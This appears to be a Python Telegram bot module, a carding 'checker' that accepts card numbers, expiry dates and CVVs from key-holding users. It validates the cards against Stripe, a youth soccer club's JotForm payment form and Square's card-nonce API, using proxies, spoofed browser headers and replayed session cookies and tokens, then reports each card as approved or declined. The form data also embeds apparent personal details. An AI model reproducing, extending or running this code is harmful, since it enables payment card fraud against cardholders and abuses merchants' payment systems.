from pyrogram import Client
from pyrogram import filters
import time
import re
import requests
from mongoDB import *
from pyrogram.types import (
    InlineKeyboardButton,
    InlineKeyboardMarkup
)
from datetime import datetime
import json
from gates.textos import *
import random
import string
import asyncio
import os
from gates.functions.func_bin import get_bin_info
from gates.functions.func_imp import get_time_taken
from gates.functions.func_esdeath import auto_sho_async
import socket


def ocultar_ip(archivo):
    with open(archivo, 'r') as file:
        contenido = file.read().splitlines()

    for proxy in contenido:
        partes = proxy.split(".")
        partes[-1] = ''
        partes[-3] = '.xxxx'
    return ''.join(partes)



async def verificar_proxies(archivo):
    with open(archivo, 'r') as file:
        contenido = file.read().splitlines()

    for proxy in contenido:
        proxy_ip, proxy_port = proxy.split(":")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        sock.settimeout(5)
        sock.connect((proxy_ip, int(proxy_port)))
        return "Live! ✅"
    except socket.error as err:
        return "Dead! ❌"
    finally:
        sock.close()
        
archivo = "/storage/emulated/0/Pixel_Chk/proxys.txt"  # Reemplaza con la ruta y nombre de tu archivo de texto
verificar_proxies(archivo)

@Client.on_message(filters.command('np',prefixes=['.','!','/',',','-','$','%','#']))
async def st(_,message):

    tiempo = time.time()
    

    if message.reply_to_message:
      input = re.findall(r'[0-9]+',str(message.reply_to_message.text))
    else:
      input = re.findall(r'[0-9]+',str(message.text))

    encontrar_usuario = collection.find_one({"_id": message.from_user.id})
    encontrar_comando = collection_cuatro.find_one({"comando": "dx"})

    #
    if encontrar_usuario is None: return await message.reply(text='<b>You are not currently registered in my database. /register</b>',quote=True)

    estado_comando = encontrar_comando.get("estado")
    if estado_comando == "❌":
        return await message.reply(text="""<b>Command: <code>Stank</code>
Gateway: <code>Stripe + Woo $15.50</code>
Estados: <code>❌</code>
Format: <code>/np cc|month|year|cvv.</code></b>""")
        


    encontrar_grupo = collection_tres.find_one({"group": str(message.chat.id)})

    if encontrar_usuario['key'] != 'None' or encontrar_grupo != None:
        if encontrar_usuario['key'] != 'None':
            if encontrar_usuario["key"] < datetime.now():            
                collection.update_one({"_id": message.from_user.id},{"$set": {"key": 'None'}})
                collection.update_one({"_id": message.from_user.id},{"$set": {"antispam": 60}})
                collection.update_one({"_id": message.from_user.id},{"$set": {"plan": 'Free'}})
                return await message.reply(text='<b>your key has expired.</b>',quote=True)
        elif encontrar_grupo["key"] < datetime.now():
            collection_tres.delete_one({"group": str(message.chat.id)})

    else: return await message.reply(text='<b>Contact an administrator to get a key.</b>',quote=True)

    
    alaa = f'''<b>Command: <code>TP</code>
Gateway: <code>Stripe + Woo $15.50</code>
Estados: <code>✅</code>
Format: <code>/np cc|month|year|cvv.</code></b>
'''
    if len(input) < 4: return await message.reply(text=alaa,quote=True)      

    tiempo_usuario = int(encontrar_usuario["time_user"])
    spam_time = int(time.time()) - tiempo_usuario
    if spam_time < encontrar_usuario['antispam']:
        tiempo_restante = encontrar_usuario['antispam'] - spam_time
        texto_spam = f"""
<b>[ANTI_SPAM_DETECTED] Try again after <code>{tiempo_restante}</code>'s</b> 
    """
        return await Client.send_message(_,chat_id=message.chat.id,text=texto_spam,reply_to_message_id=message.id)

    collection.update_one({"_id": message.from_user.id},{"$set": {"time_user": int(time.time())}})


    balon= {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'accept': '*/*',
    'content-type': 'text/plain;charset=UTF-8'
    }
    

    apigate2 = requests.post('https://m.stripe.com/6', headers=balon).json()

    muid = apigate2["muid"]
    guid = apigate2["guid"]
    sid = apigate2["sid"]
    reply = await message.reply_text("<b>Cargando proceso...</b>")  
    archivo = "/storage/emulated/0/Pixel_Chk/proxys.txt"
    ip = ocultar_ip(archivo)
    proxy = await verificar_proxies(archivo)
    
    cc = input[0]
    mes = input[1]
    ano = input[2]
    cvv = input[3]
    users = message.from_user.username
    bin = cc[:6]
    await reply.edit_text(f"""
<code><i>Gateway ➤</i></code> <b>Stripe + Woo</b>
<i><b>➜[Credit Card] »</b></i><code>{cc}|{mes}|{ano}|{cvv}</code>
<i><b>➜[Loading]...■■■□□□□□□□ →30%</b></i>
<i><b>➜[Time] » → {tiempo}</b></i>sg""")


    x = get_bin_info (cc[0:6])

#-----------------------------------------------------------------------------------------------


    with open('/storage/emulated/0/Pixel_Chk/proxys.txt') as f:
        lines = f.readlines()
    for proxs in lines:
        proxies =  {
            'http': f'{proxs}', 
            'https': f'{proxs}'
}
        
        
        
        
    url = 'https://payments.bigcommerce.com/api/public/v1/orders/payments'

    cookies = {
    'userReferer': 'https%3A%2F%2Fform.jotform.com%2F',
    'JOTFORM_SESSION': '2581e6e6-9903-db50-34cf-74b4c599',
    'guest': 'guest_a0a6740a2cdbc20d',
    'fromStripePayment': '5749631472444295005',
    'language': 'es-ES',
}

    headers = {
    'authority': 'submit.jotform.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'accept-language': 'es-ES,es;q=0.9',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'userReferer=https%3A%2F%2Fform.jotform.com%2F; JOTFORM_SESSION=2581e6e6-9903-db50-34cf-74b4c599; guest=guest_a0a6740a2cdbc20d; fromStripePayment=5749631472444295005; language=es-ES',
    'origin': 'https://form.jotform.com',
    'pragma': 'no-cache',
    'referer': 'https://form.jotform.com/',
    'sec-ch-ua': '"Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'iframe',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-site',
    'sec-gpc': '1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
}

    params = {
    'submit_source': [
        'form',
        'direct',
    ],
}

    data = {
    'formID': '200497302740247',
    'jsExecutionTracker': 'ready-done-1699153970246',
    'q73_selectSeason': 'CHECKED: SOLD OUT - FALL 2023 (OCTOBER- DECEMBER) ',
    'q72_selectProgram72': 'CHECKED: 2023 FALL SEASON WEEKLY PROGRAM: THURSDAY 6:00PM - 6:55PM (4 - 9 years old)',
    'q5_athletesName[first]': '',
    'q5_athletesName[last]': 'Lopez',
    'q65_birthDate65[month]': 'July',
    'q65_birthDate65[day]': '15',
    'q65_birthDate65[year]': '1997',
    'q66_gender66': 'Male',
    'q13_name[first]': 'Renga',
    'q13_name[last]': 'Lopez',
    'q15_cellNumber[area]': '1',
    'q15_cellNumber[phone]': '84922248',
    'q16_email16': 'nefim503@gmail.com',
    'q18_emergencyContacts[first]': 'Renga',
    'q18_emergencyContacts[last]': 'Lopez',
    'q19_relationship19': 'Other',
    'q20_phoneNumber20[area]': '1',
    'q20_phoneNumber20[phone]': '84922248',
    'q22_doesThe': 'No',
    'q23_isThe': 'No',
    'simple_fpc': '79',
    'payment_transaction_uuid': '018b9d77f5ef7b22b4ca7abd48b3e37d1536',
    'payment_total_checksum': '6.97',
    'payment_discount_value': '0',
    'q79_myProducts[special_1006][item_0]': 'YS',
    'q79_myProducts[][id]': '1007',
    'q79_myProducts[special_1007][item_0]': 'SIZE 1 (13k-3)',
    'coupon-input': '',
    'coupon': '',
    'q79_myProducts[cc_firstName]': 'Renga',
    'q79_myProducts[cc_lastName]': 'Lopez',
    'website': '',
    'simple_spc': '200497302740247-200497302740247',
    'embedUrl': 'https://www.alderwoodsoccer.com/',
    'event_id': '1699153970240_200497302740247_GXnhBk9',
    'validatedNewRequiredFieldIDs': '"No validated required fields"',
    'buyerVerification': 'verf:CA4SEAKQ2xE4hLSIcI55JKP-o9YoAQ',
    'square_pm': 'Card',
    'square_nonce': 'cnon:CBESEPee3rompzBdhyU6akNwaBY',
}

    response = requests.post(
    'https://submit.jotform.com/submit/200497302740247',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data,
)
    print(response)
    await asyncio.sleep(5)
    #decoded_response = response.text
    #result = json.loads(decoded_response)
    #id = result['id']
    #id2 = result['client_secret']
    url = 'https://pci-connect.squareup.com/v2/card-nonce'

    await reply.edit_text(f"""
<code><i>Gateway ➤</i></code> <b>Stripe + Woo</b>
<i><b>➜[Credit Card] »</b></i><code>{cc}|{mes}|{ano}|{cvv}</code>
<i><b>➜[Loading]...■■■■■■■■■□ →95%</b></i>
<i><b>➜[Time] » → {tiempo}</b></i>sg""") 
    
    time.sleep(5)
    
    cookies = {
    '_savt': '575f0b22-b9e1-4d46-9534-59dd3d59dc58',
    '__cf_bm': '8MdK1NI2tSKQreTcBgnmAI5YvP2Sj6NTStMBntimvZI-1699153855-0-AYBitgTjMawC9NLsBGVhUc5KYaT6Hz/QViiPGZ3/binxCW9dWciIVFWUk/9N6HnXCSdBDRe4xk3X2ooSQzOUogE=',
}

    headers = {
    'authority': 'pci-connect.squareup.com',
    'accept': 'application/json',
    'accept-language': 'es-ES,es;q=0.9',
    'cache-control': 'no-cache',
    'content-type': 'application/json; charset=utf-8',
    # 'cookie': '_savt=575f0b22-b9e1-4d46-9534-59dd3d59dc58; __cf_bm=8MdK1NI2tSKQreTcBgnmAI5YvP2Sj6NTStMBntimvZI-1699153855-0-AYBitgTjMawC9NLsBGVhUc5KYaT6Hz/QViiPGZ3/binxCW9dWciIVFWUk/9N6HnXCSdBDRe4xk3X2ooSQzOUogE=',
    'origin': 'https://web.squarecdn.com',
    'pragma': 'no-cache',
    'referer': 'https://web.squarecdn.com/',
    'sec-ch-ua': '"Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'sec-gpc': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
}

    params = {
    '_': '1699153945883.115',
    'version': '1.53.0',
}

    json_data = {
    'client_id': 'sq0idp-6hj_oP1Z6MUXu_rUpVOYHg',
    'location_id': 'ZBF5KVS8D7D3S',
    'payment_method_tracking_id': '5bf5a650-9333-9806-f10f-3a0a3ce8d9e1',
    'session_id': 'ayRUlR3pC3uJqprpV0DaVP2HCpijsX0gNHkQru6y9QQTuoi0bgP2JFNSbdRpHTraioaA24jLTJLEvzV6N9U=',
    'website_url': 'form.jotform.com',
    'analytics_token': 'DRBS35JRQOUF3MAH4UHAKGUM4KV7S2CAWNNAIVDR5AAZ6HS3LKCNFE3F6NQWMODYJ6TTRWVYAYDM44Y4RHSUXZXECKTJNT2FLPLQ',
    'card_data': {
        'cvv': f'{cvv}',
        'exp_month': ""+mes+"",
        'exp_year': ""+ano+"",
        'number': f'{cc}',
    },
}

    response = requests.post(
    'https://pci-connect.squareup.com/v2/card-nonce',
    params=params,
    cookies=cookies,
    headers=headers,
    json=json_data,
)
    print("================================================================")
    print(response)
    resultado = response.json()
    
    if resultado == 'None':
        mensaje = 'Charged $15.99 USD'
        status = 'Approved'
        logo = '✅'
    elif resultado == '2001 Insufficient Funds':
        mensaje = '2001 Insufficient Funds'
        status = 'Approved'
        logo = '✅' 
    elif resultado == 'Approved':
        mensaje = 'Approved'
        status = 'Approved'
        logo = '✅'
    elif resultado == 'GENERIC_DECLINE':
        mensaje = 'GENERIC_DECLINE'
        status = 'Declined'
        logo = '❌'
    elif resultado == 'Invalid card data.':
        mensaje = 'Invalid card data.'
        status = 'Declined'
        logo = '❌'
    elif resultado == '2038 Processor Declined':
        mensaje = '2038 Processor Declined'
        status = 'Declined'
        logo = '❌'
    elif resultado == '2044 Declined - Call Issuer':
        mensaje = '2044 Declined - Call Issuer'
        status = 'Declined'
        logo = '❌'
    elif resultado == '2047 Call Issuer. Pick Up Card.':
        mensaje = '2047 Call Issuer. Pick Up Card.'
        status = 'Declined'
        logo = '❌'
    elif resultado == '2007 No Account':
        mensaje = '2007 No Account'
        status = 'Declined'
        logo = '❌'
    elif resultado == '2004 Expired Card':
        mensaje = '2004 Expired Card'
        status = 'Declined'
        logo = '❌'
    elif resultado == '2015 Transaction Not Allowed':
        mensaje = '2015 Transaction Not Allowed'
        status = 'Declined'
        logo = '❌'
    elif resultado == 'EXPECTED_INTEGER':
        mensaje = 'EXPECTED_INTEGER'
        status = 'Declined'
        logo = '❌'
    elif resultado == 'Your payment was declined. Please try again.':
        mensaje = 'Your payment was declined. Please try again.'
        status = 'Declined'
        logo = '❌'
    else:
        mensaje = resultado
        status = 'Declined'
        logo = '❌'  
         
    keyboard = InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton("📿 Canal", url="https://t.me/+rtV8voEx9vA0ODRh"),
               
            ]
        ]
    )
    await reply.edit_text(f"""
<code><i>Gateway ➤</i></code> <b>Stripe + Woo</b>
<i><b>➜[Credit Card] »</b></i><code>{cc}|{mes}|{ano}|{cvv}</code>
<i><b>➜[Loading]...■■■■■■■■■■→100%</b></i>
<i><b>➜[Time] » → {tiempo}</b></i>sg""") 
            
               
    texto_final = (f"""<b>🩵Ｈｘｃｋ🩵Ｃｈｋ🩵Ｂｏｔ🩵

<b><a href="https://t.me/+rtV8voEx9vA0ODRh">━━━━━━༺༻ ━━━━━━</a>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Card: <code>{cc}|{mes}|{ano}|{cvv}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Status: <code>{status} {logo}</code></b> 
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Reponse: <code>{mensaje}</code>
✄┈┈┈┈┈┈┈┈┈┈┈┈┈┈
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Bin: <code>{cc[0:6]}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Type: <code>{x.get("vendor")} / {x.get("type")} / {x.get("level")}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Bank : <code>{x.get("bank_name")}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Country: <code>{x.get("country")} {x.get("flag")}</code>
⧽<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Gateways: <code> Shopify+b3 </code>

⧽<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Proxy: <code>{ip} {proxy}</code>
⪨<a href="https://t.me/+rtV8voEx9vA0ODRh">🜲</a>⪩ User: @{users} [{encontrar_usuario["plan"]}]
<a href="https://t.me/+rtV8voEx9vA0ODRh">━━━━━━༺༻ ━━━━━━</a></b>""")
    await reply.edit(text=texto_final, disable_web_page_preview=True) 
            
